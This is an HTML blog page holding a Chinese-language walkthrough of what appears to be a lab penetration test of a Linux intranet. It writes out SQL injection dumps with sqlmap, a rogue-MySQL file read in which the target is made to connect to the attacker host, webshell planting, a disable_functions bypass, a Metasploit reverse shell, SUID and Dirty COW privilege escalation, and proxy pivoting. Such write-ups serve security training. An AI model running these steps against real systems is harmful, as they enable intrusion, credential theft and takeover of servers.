@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="hacktrick,hacktrick,Dmagic" />
+  <meta name="author" content="hacktrick" />
+  <meta name="description" content="hacktrick" />
+  
+  
+  <title>
+    
+      实战项目五 linux内网完整渗透测试 
+      
+      
+      |
+    
+     hacktrick
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/img.jpg">
+    <link rel="icon" href="/img.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/img.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Dmagic</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Posts</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">实战项目五 linux内网完整渗透测试</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2021-08-08 12:00:00
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h1 id="实战项目五-linux内网完整渗透测试"><a href="#实战项目五-linux内网完整渗透测试" class="headerlink" title="实战项目五 linux内网完整渗透测试"></a>实战项目五 linux内网完整渗透测试</h1><p>[TOC]</p>
+<h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h2><p>Kali ：192.168.0.128</p>
+<p>Ubuntu：192.168.0.122 10.10.10.145</p>
+<p>Centos：10.10.10.144</p>
+<p>绑定host</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210805194226646.png" alt="image-20210805194226646"></p>
+<h2 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2 端口扫描"></a>2 端口扫描</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p21,80,888,3306,8888 -sV -sC -T4 -Pn -oA www.ddd4.com www.ddd4.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210805194407543.png" alt="image-20210805194407543"></p>
+<p>开放 21 80 888 3306 8888</p>
+<p>21 ftp</p>
+<p>80 http</p>
+<p>3306 mysql</p>
+<p>8888 bt</p>
+<h2 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3 目录扫描"></a>3 目录扫描</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://www.ddd4.com/ --full-url -t 50 -o dir.txt --exclude-sizes=12kb,261b</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210805194833021.png" alt="image-20210805194833021"></p>
+<p>/admini 管理后台</p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210805195343915.png" alt="image-20210805195343915"></p>
+<p>/phpinfo.php 获取到网站绝对路径</p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210805195424816.png" alt="image-20210805195424816"></p>
+<h2 id="4-CMS漏洞查找"><a href="#4-CMS漏洞查找" class="headerlink" title="4 CMS漏洞查找"></a>4 CMS漏洞查找</h2><p>通过网站得到历史漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/8723430.html">https://www.cnblogs.com/xiaozi/p/8723430.html</a></p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210805195623255.png" alt="image-20210805195623255"></p>
+<p>获得一处sql注入漏洞</p>
+<h2 id="5-SQLmap利用SQL注入漏洞"><a href="#5-SQLmap利用SQL注入漏洞" class="headerlink" title="5 SQLmap利用SQL注入漏洞"></a>5 SQLmap利用SQL注入漏洞</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.ddd4.com/search/?keyword=123&quot; --tamper=chardoubleencode -D www_ddd4_com -T doc_user -C &quot;username,pwd&quot; --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210805200035158.png" alt="image-20210805200035158"></p>
+<p>密码无法解密，无法登录后台。</p>
+<h2 id="6-SSRF读取文件"><a href="#6-SSRF读取文件" class="headerlink" title="6 SSRF读取文件"></a>6 SSRF读取文件</h2><p>这里暗月师傅的利用刚开始没有看明白，后来反应过来是一处ssrf。这里利用的Mysql 客户端的一个特性，构造了恶意服务器，进一步利用漏洞。漏洞的场景也比较特殊，发生在Mysql连接上，是一个很有趣的SSRF。 <a target="_blank" rel="noopener" href="https://paper.seebug.org/1112/">https://paper.seebug.org/1112/</a></p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210805201230947.png" alt="image-20210805201230947"></p>
+<p>代码分析：由于变量全部可控且未经过任何过滤，第七行中的mysql_connect可以连接远程mysql服务器，第十一行查询mysql数据库的所有数据库，将结果进行处理赋值给data变量，通过in_array进行查找。</p>
+<p>由于<strong>服务端可以在任何查询语句后回复文件传输请求</strong>，所以我们就可以指定客户端读取本地文件并给我们了。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rogue_mysql_server.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210805203435541.png" alt="image-20210805203435541"></p>
+<p>curl发起请求</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://www.ddd4.com/setup/checkdb.php?dbname=mysql&amp;uname=root&amp;pwd=123456&amp;dbhost=192.168.0.128&amp;action=chkdb</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210805203535560.png" alt="image-20210805203535560"></p>
+<p>查看mysq.log文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat mysql.log</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210805203625087.png" alt="image-20210805203625087"></p>
+<p>读取数据库配置文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat mysql.log</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806033550823.png" alt="image-20210806033550823"></p>
+<p>user：www_ddd4_com password:x4ix6ZrM7b8nFYHn</p>
+<h2 id="7-登录mysql替换登录密码"><a href="#7-登录mysql替换登录密码" class="headerlink" title="7 登录mysql替换登录密码"></a>7 登录mysql替换登录密码</h2><p>通过本地搭建获得加密后的admin密码，我们将我们的密码直接替换过去。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h192.168.0.122 -uwww_ddd4_com -px4ix6ZrM7b8nFYHn</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806033811194.png" alt="image-20210806033811194"></p>
+<p>替换登录密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update doc_user set pwd&#x3D;&#39;33e2q1yc3d033e22aesyc2140aec3l850c3a99s21232f297uj57a5a7438n4a0ex4a801yc3d0&#39; where id&#x3D;1;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806033847968.png" alt="image-20210806033847968"></p>
+<p>成功登录后台</p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806034240341.png" alt="image-20210806034240341"></p>
+<h2 id="8-模板文件getshell"><a href="#8-模板文件getshell" class="headerlink" title="8 模板文件getshell"></a>8 模板文件getshell</h2><p>登录后台，一眼看见模板文件，直觉告诉我他可以getshell。不出所料，可以修改php文件，我们直接写入一句话进行连接。</p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806034413589.png" alt="image-20210806034413589"></p>
+<p>使用Antsword连接失败，切换中国菜刀进行连接。</p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806034507529.png" alt="image-20210806034507529"></p>
+<h2 id="9-bypass-disablefunc"><a href="#9-bypass-disablefunc" class="headerlink" title="9 bypass_disablefunc"></a>9 bypass_disablefunc</h2><p>使用菜刀执行命令，发现失败了！查看phpinfo，发现disablefunc禁用多个函数</p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806034859585.png" alt="image-20210806034859585"></p>
+<p>使用 <a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a> 进行bypass。上传bypass_disablefunc_x64.so 和 bypass_disablefunc.php。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.ddd4.com&#x2F;bypass_disablefunc.php?cmd&#x3D;ifconfig&amp;outpath&#x3D;&#x2F;tmp&#x2F;xx&amp;sopath&#x3D;&#x2F;www&#x2F;wwwroot&#x2F;www.ddd4.com&#x2F;bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806040404111.png" alt="image-20210806040404111"></p>
+<p>成功bypass</p>
+<h2 id="10-MSF反弹shell"><a href="#10-MSF反弹shell" class="headerlink" title="10 MSF反弹shell"></a>10 MSF反弹shell</h2><p>使用exploit/multi/script/web_delivery 进行反弹shell，设置target和 LHOST 以及 payload即可。</p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806040554905.png" alt="image-20210806040554905"></p>
+<p>将Msf给的命令url编码之后，执行命令。</p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806040644559.png" alt="image-20210806040644559"></p>
+<p>成功反弹shell</p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806040706367.png" alt="image-20210806040706367"></p>
+<h2 id="11-上传PEAS进行信息收集"><a href="#11-上传PEAS进行信息收集" class="headerlink" title="11 上传PEAS进行信息收集"></a>11 上传PEAS进行信息收集</h2><p>PEAS：<a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806040804510.png" alt="image-20210806040804510"></p>
+<p>发现find命令具有suid特权</p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806042323522.png" alt="image-20210806042323522"></p>
+<p>进入用户目录发现bt密码与flag.txt</p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806042403617.png" alt="image-20210806042403617"></p>
+<h2 id="12-使用find命令进行suid提权"><a href="#12-使用find命令进行suid提权" class="headerlink" title="12 使用find命令进行suid提权"></a>12 使用find命令进行suid提权</h2><p>进入 <a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> 查看find命令的suid提权</p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806042515219.png" alt="image-20210806042515219"></p>
+<p>使用find命令提权</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -exec &#x2F;bin&#x2F;sh -p \; -quit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806042914311.png" alt="image-20210806042914311"></p>
+<p>使用MSF以root权限反弹shell</p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806043046702.png" alt="image-20210806043046702"></p>
+<p>getuid获取当前用户</p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806043345926.png" alt="image-20210806043345926"></p>
+<h2 id="13-获取flag"><a href="#13-获取flag" class="headerlink" title="13 获取flag"></a>13 获取flag</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -exec /bin/sh -p \; -quit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806053220573.png" alt="image-20210806053220573"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;root.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806053238894.png" alt="image-20210806053238894"></p>
+<h2 id="14-MSF加载路由跨网段渗透"><a href="#14-MSF加载路由跨网段渗透" class="headerlink" title="14 MSF加载路由跨网段渗透"></a>14 MSF加载路由跨网段渗透</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;multi&#x2F;manage&#x2F;autoroute</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806043620543.png" alt="image-20210806043620543"></p>
+<p>发现另外一台机器</p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806043814491.png" alt="image-20210806043814491"></p>
+<p>修改host文件</p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806045647258.png" alt="image-20210806045647258"></p>
+<h2 id="15-MSF创建socks代理"><a href="#15-MSF创建socks代理" class="headerlink" title="15 MSF创建socks代理"></a>15 MSF创建socks代理</h2><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806045429261.png" alt="image-20210806045429261"></p>
+<p>修改proxychains配置文件</p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806045520553.png" alt="image-20210806045520553"></p>
+<p>使用firefox访问</p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806045725108.png" alt="image-20210806045725108"></p>
+<h2 id="16-Nmap扫描端口"><a href="#16-Nmap扫描端口" class="headerlink" title="16 Nmap扫描端口"></a>16 Nmap扫描端口</h2><p>首先使用threader快速扫描开放端口</p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806050732190.png" alt="image-20210806050732190"></p>
+<p>使用Nmap针对性探测端口信息</p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806050758416.png" alt="image-20210806050758416"></p>
+<h2 id="17-emlog插件getshell"><a href="#17-emlog插件getshell" class="headerlink" title="17 emlog插件getshell"></a>17 emlog插件getshell</h2><p>使用弱口令登录后台，制作包含后门的插件包上传。</p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806065951674.png" alt="image-20210806065951674"></p>
+<p>成功getshell</p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806070020361.png" alt="image-20210806070020361"></p>
+<h2 id="18-使用脏牛提权"><a href="#18-使用脏牛提权" class="headerlink" title="18 使用脏牛提权"></a>18 使用脏牛提权</h2><p>使用AntSword设置socks5代理</p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806070847207.png" alt="image-20210806070847207"></p>
+<p>查看linux版本以及当前用户</p>
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806070916054.png" alt="image-20210806070916054"></p>
+<p>搜索脏牛exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m linux&#x2F;local&#x2F;40839.c</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806070958737.png" alt="image-20210806070958737"></p>
+<p>上传exp编译</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread 40839.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806071304912.png" alt="image-20210806071304912"></p>
+<p>使用chmod添加exp可执行权限，并运行exp。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x dirty</span><br><span class="line">.&#x2F;dirty 123456</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806071420505.png" alt="image-20210806071420505"></p>
+<p>user：fireafart pass：123456</p>
+<h2 id="19-获取flag"><a href="#19-获取flag" class="headerlink" title="19 获取flag"></a>19 获取flag</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains ssh firefart@10.10.10.144</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/magisec/images/raw/master/image-20210806071540533.png" alt="image-20210806071540533"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2021/06/12/FRP%E6%94%B9%E9%80%A0/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2021-08-08 12:00:00
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2021/08/08/%E5%AE%9E%E6%88%98%E9%A1%B9%E7%9B%AE%E5%9B%9B%20%E5%AE%8C%E6%95%B4%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E4%BE%8B/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div class="post-catalog" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E9%A1%B9%E7%9B%AE%E4%BA%94-linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-text">实战项目五 linux内网完整渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">1. 环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">2 端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-text">3 目录扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-CMS%E6%BC%8F%E6%B4%9E%E6%9F%A5%E6%89%BE"><span class="toc-text">4 CMS漏洞查找</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-SQLmap%E5%88%A9%E7%94%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">5 SQLmap利用SQL注入漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-SSRF%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-text">6 SSRF读取文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E7%99%BB%E5%BD%95mysql%E6%9B%BF%E6%8D%A2%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81"><span class="toc-text">7 登录mysql替换登录密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-%E6%A8%A1%E6%9D%BF%E6%96%87%E4%BB%B6getshell"><span class="toc-text">8 模板文件getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-bypass-disablefunc"><span class="toc-text">9 bypass_disablefunc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-MSF%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">10 MSF反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-%E4%B8%8A%E4%BC%A0PEAS%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">11 上传PEAS进行信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-%E4%BD%BF%E7%94%A8find%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8Csuid%E6%8F%90%E6%9D%83"><span class="toc-text">12 使用find命令进行suid提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13-%E8%8E%B7%E5%8F%96flag"><span class="toc-text">13 获取flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14-MSF%E5%8A%A0%E8%BD%BD%E8%B7%AF%E7%94%B1%E8%B7%A8%E7%BD%91%E6%AE%B5%E6%B8%97%E9%80%8F"><span class="toc-text">14 MSF加载路由跨网段渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#15-MSF%E5%88%9B%E5%BB%BAsocks%E4%BB%A3%E7%90%86"><span class="toc-text">15 MSF创建socks代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#16-Nmap%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3"><span class="toc-text">16 Nmap扫描端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#17-emlog%E6%8F%92%E4%BB%B6getshell"><span class="toc-text">17 emlog插件getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#18-%E4%BD%BF%E7%94%A8%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83"><span class="toc-text">18 使用脏牛提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#19-%E8%8E%B7%E5%8F%96flag"><span class="toc-text">19 获取flag</span></a></li></ol></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/magisec/">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/magisec/magisec.github.io">Theme by Hacktrick</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="back-to-top hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+      
+  <div class="search-icon" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+    </div>
+  </body>
+</html>
